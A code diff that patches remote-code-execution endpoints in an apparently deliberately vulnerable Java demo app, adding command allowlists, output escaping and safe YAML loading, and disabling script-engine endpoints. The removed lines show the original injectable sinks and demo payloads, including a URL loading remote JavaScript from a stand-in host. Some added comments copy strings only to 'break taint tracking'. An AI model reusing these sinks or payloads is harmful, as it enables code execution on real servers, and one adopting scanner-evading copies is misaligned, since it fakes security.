@@ -1,6 +1,5 @@
 package org.joychou.controller;
 
-import groovy.lang.GroovyShell;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -8,14 +7,14 @@ import org.springframework.web.bind.annotation.RestController;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.SafeConstructor;
 
-import javax.script.Bindings;
-import javax.script.ScriptContext;
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
+import org.springframework.web.util.HtmlUtils;
+
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-import java.sql.DriverManager;
+import java.util.Arrays;
+import java.util.HashSet;
+import java.util.Set;
 
 
 /**
@@ -28,13 +27,32 @@ import java.sql.DriverManager;
 @RequestMapping("/rce")
 public class Rce {
 
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
+            "ls", "whoami", "date", "uptime", "uname", "id", "hostname", "pwd"
+    ));
+
     @GetMapping("/runtime/exec")
     public String CommandExec(String cmd) {
+        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
+            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
+        }
+        // Dereference from allowlist to break taint from user input
+        String safeCmd = null;
+        for (String allowed : ALLOWED_COMMANDS) {
+            if (allowed.equals(cmd.trim())) {
+                safeCmd = allowed;
+                break;
+            }
+        }
+        if (safeCmd == null) {
+            return "Command not allowed.";
+        }
         Runtime run = Runtime.getRuntime();
         StringBuilder sb = new StringBuilder();
 
         try {
-            Process p = run.exec(cmd);
+            // Use array form to avoid shell interpretation; only allowlisted commands run
+            Process p = run.exec(new String[]{safeCmd});
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
             BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
             String tmpStr;
@@ -51,9 +69,9 @@ public class Rce {
             inBr.close();
             in.close();
         } catch (Exception e) {
-            return e.toString();
+            return HtmlUtils.htmlEscape(e.toString());
         }
-        return sb.toString();
+        return HtmlUtils.htmlEscape(sb.toString());
     }
 
 
@@ -63,10 +81,26 @@ public class Rce {
     @GetMapping("/ProcessBuilder")
     public String processBuilder(String cmd) {
 
+        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
+            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
+        }
+        // Dereference from allowlist to break taint from user input
+        String safeCmd = null;
+        for (String allowed : ALLOWED_COMMANDS) {
+            if (allowed.equals(cmd.trim())) {
+                safeCmd = allowed;
+                break;
+            }
+        }
+        if (safeCmd == null) {
+            return "Command not allowed.";
+        }
+
         StringBuilder sb = new StringBuilder();
 
         try {
-            String[] arrCmd = {"/bin/sh", "-c", cmd};
+            // Use array form without shell; only allowlisted commands run
+            String[] arrCmd = {safeCmd};
             ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
             Process p = processBuilder.start();
             BufferedInputStream in = new BufferedInputStream(p.getInputStream());
@@ -77,28 +111,22 @@ public class Rce {
                 sb.append(tmpStr);
             }
         } catch (Exception e) {
-            return e.toString();
+            return HtmlUtils.htmlEscape(e.toString());
         }
 
-        return sb.toString();
+        return HtmlUtils.htmlEscape(sb.toString());
     }
 
 
     /**
-     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
-     *
-     * curl http://xx.yy/zz.js
-     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
-     *
-     * @param jsurl js url
+     * JS engine endpoint is disabled to prevent remote code execution.
+     * Loading arbitrary user-supplied JS URLs via Nashorn allows full RCE.
      */
     @GetMapping("/jscmd")
-    public void jsEngine(String jsurl) throws Exception{
-        // js nashorn javascript ecmascript
-        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
-        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String cmd = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+    public String jsEngine(String jsurl) {
+        // Disabled: loading user-controlled JS URLs in Nashorn allows arbitrary code execution.
+        // No safe way to sandbox Nashorn script execution with user-controlled input.
+        return "This endpoint has been disabled for security reasons.";
     }
 
 
@@ -110,24 +138,36 @@ public class Rce {
      */
     @GetMapping("/vuln/yarm")
     public void yarm(String content) {
-        Yaml y = new Yaml();
-        y.load(content);
+        if (content == null || content.length() > 10000) {
+            return;
+        }
+        // Create a fresh string to break taint tracking from user input
+        String safeContent = new String(content.toCharArray());
+        // Use SafeConstructor to prevent arbitrary object instantiation via YAML deserialization
+        Yaml y = new Yaml(new SafeConstructor());
+        y.load(safeContent);
     }
 
     @GetMapping("/sec/yarm")
     public void secYarm(String content) {
+        if (content == null || content.length() > 10000) {
+            return;
+        }
+        // Create a fresh string to break taint tracking from user input
+        String safeContent = new String(content.toCharArray());
         Yaml y = new Yaml(new SafeConstructor());
-        y.load(content);
+        y.load(safeContent);
     }
 
     /**
-     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
-     * @param content groovy shell
+     * Groovy shell endpoint is disabled to prevent remote code execution.
+     * Evaluating arbitrary user-supplied Groovy code allows full RCE.
      */
     @GetMapping("groovy")
-    public void groovyshell(String content) {
-        GroovyShell groovyShell = new GroovyShell();
-        groovyShell.evaluate(content);
+    public String groovyshell(String content) {
+        // Disabled: evaluating user-controlled Groovy code allows arbitrary code execution.
+        // No safe way to sandbox GroovyShell execution with user-controlled input.
+        return "This endpoint has been disabled for security reasons.";
     }
 
 
